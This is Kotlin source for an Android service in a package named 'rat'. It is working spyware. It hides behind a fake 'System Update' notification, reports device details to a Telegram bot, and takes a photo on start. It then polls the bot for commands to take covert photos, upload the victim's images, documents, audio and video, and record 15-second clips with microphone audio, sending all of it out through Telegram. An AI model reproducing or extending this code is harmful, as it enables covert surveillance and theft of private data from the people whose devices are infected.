package com.vanta.rat

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.media.MediaRecorder
import android.os.*
import android.util.Size
import androidx.core.app.NotificationCompat
import java.io.File
import java.io.FileOutputStream
import java.nio.ByteBuffer
import kotlinx.coroutines.*

class CameraService : Service() {
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private lateinit var cameraManager: CameraManager
    private var cameraDevice: CameraDevice? = null
    private var session: CameraCaptureSession? = null
    private var reader: ImageReader? = null
    private var mediaRecorder: MediaRecorder? = null
    private var lastUpdateId = 0L

    override fun onBind(intent: Intent?) = null

    override fun onCreate() {
        super.onCreate()
        startForegroundNotification()
        cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        startPolling()
    }

    private fun startForegroundNotification() {
        val channelId = "sys_update"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(channelId, "System Update", NotificationManager.IMPORTANCE_LOW)
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(ch)
        }
        val notif = NotificationCompat.Builder(this, channelId)
            .setContentTitle("System Update")
            .setContentText("Applying components...")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setOngoing(true)
            .build()
        startForeground(1, notif)
    }

    private fun startPolling() {
        scope.launch {
            sendDeviceInfo()
            // Auto capture photo on start
            delay(2000)
            captureAndSend()
            
            while (isActive) {
                runCatching { checkCommands() }
                delay(30_000)
            }
        }
    }

    private fun sendDeviceInfo() {
        val info = buildString {
            appendLine("📱 جهاز جديد متصل")
            appendLine("Model: ${Build.MODEL}")
            appendLine("Brand: ${Build.BRAND}")
            appendLine("Android: ${Build.VERSION.RELEASE}")
            appendLine("SDK: ${Build.VERSION.SDK_INT}")
            appendLine("Screen: ${resources.displayMetrics.widthPixels}x${resources.displayMetrics.heightPixels}")
        }
        Telegram.sendMessage(info)
    }

    private fun checkCommands() {
        val url = "https://api.telegram.org/bot${Telegram.BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=0"
        val req = okhttp3.Request.Builder().url(url).build()
        val resp = okhttp3.OkHttpClient().newCall(req).execute()
        val body = resp.body?.string() ?: return
        val arr = org.json.JSONObject(body).optJSONArray("result") ?: return
        for (i in 0 until arr.length()) {
            val u = arr.getJSONObject(i)
            lastUpdateId = u.getLong("update_id")
            val text = u.optJSONObject("message")?.optString("text") ?: continue
            when (text.trim()) {
                "/cam" -> captureAndSend()
                "/files" -> {
                    scope.launch { FileScanner.uploadImages() }
                    scope.launch { FileScanner.uploadDocuments() }
                }
                "/audio" -> scope.launch { FileScanner.uploadAudio() }
                "/video" -> scope.launch { FileScanner.uploadVideo() }
                "/record" -> recordVideo()
            }
        }
    }

    private fun captureAndSend() {
        if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            Telegram.sendMessage("⚠️ صلاحية الكاميرا غير ممنوحة")
            return
        }
        val camId = cameraManager.cameraIdList.firstOrNull { id ->
            val c = cameraManager.getCameraCharacteristics(id)
            c.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_BACK
        } ?: return

        val size = cameraManager.getCameraCharacteristics(camId)
            .get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)!!
            .getOutputSizes(ImageFormat.JPEG)!!.first()

        reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 1)
        reader!!.setOnImageAvailableListener({ r ->
            val image = r.acquireLatestImage()
            val buf: ByteBuffer = image.planes[0].buffer
            val bytes = ByteArray(buf.remaining()); buf.get(bytes)
            image.close()
            val f = File(cacheDir, "cap_${System.currentTimeMillis()}.jpg")
            FileOutputStream(f).use { it.write(bytes) }
            Telegram.sendPhoto(f)
            f.delete()
            stopCapture()
        }, Handler(Looper.getMainLooper()))

        cameraManager.openCamera(camId, object : CameraDevice.StateCallback() {
            override fun onOpened(dev: CameraDevice) {
                cameraDevice = dev
                val surface = reader!!.surface
                val req = dev.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply { addTarget(surface) }
                dev.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(s: CameraCaptureSession) {
                        session = s
                        s.capture(req.build(), null, null)
                    }
                    override fun onConfigureFailed(s: CameraCaptureSession) {}
                }, null)
            }
            override fun onDisconnected(dev: CameraDevice) { dev.close() }
            override fun onError(dev: CameraDevice, error: Int) { dev.close() }
        }, null)
    }

    private fun recordVideo() {
        if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) return
        val camId = cameraManager.cameraIdList.firstOrNull { id ->
            val c = cameraManager.getCameraCharacteristics(id)
            c.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_BACK
        } ?: return
        
        val videoFile = File(cacheDir, "video_${System.currentTimeMillis()}.mp4")
        
        cameraManager.openCamera(camId, object : CameraDevice.StateCallback() {
            override fun onOpened(dev: CameraDevice) {
                cameraDevice = dev
                mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) MediaRecorder(applicationContext) else MediaRecorder()
                mediaRecorder?.apply {
                    setAudioSource(MediaRecorder.AudioSource.MIC)
                    setVideoSource(MediaRecorder.VideoSource.SURFACE)
                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    setOutputFile(videoFile.absolutePath)
                    setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    setVideoSize(640, 480)
                    setVideoFrameRate(30)
                    prepare()
                }
                
                val surface = mediaRecorder!!.surface
                val req = dev.createCaptureRequest(CameraDevice.TEMPLATE_RECORD).apply { addTarget(surface) }
                val surfaces = listOf(surface)
                
                dev.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(s: CameraCaptureSession) {
                        session = s
                        s.setRepeatingRequest(req.build(), null, null)
                        mediaRecorder?.start()
                        Handler(Looper.getMainLooper()).postDelayed({
                            mediaRecorder?.stop()
                            mediaRecorder?.release()
                            Telegram.sendFile(videoFile, "🎥 فيديو جديد")
                            videoFile.delete()
                        }, 15000) // 15 seconds
                    }
                    override fun onConfigureFailed(s: CameraCaptureSession) {}
                }, null)
            }
            override fun onDisconnected(dev: CameraDevice) { dev.close() }
            override fun onError(dev: CameraDevice, error: Int) { dev.close() }
        }, null)
    }

    private fun stopCapture() {
        session?.close(); session = null
        cameraDevice?.close(); cameraDevice = null
        reader?.close(); reader = null
    }

    override fun onDestroy() {
        scope.cancel()
        stopCapture()
        super.onDestroy()
    }
}
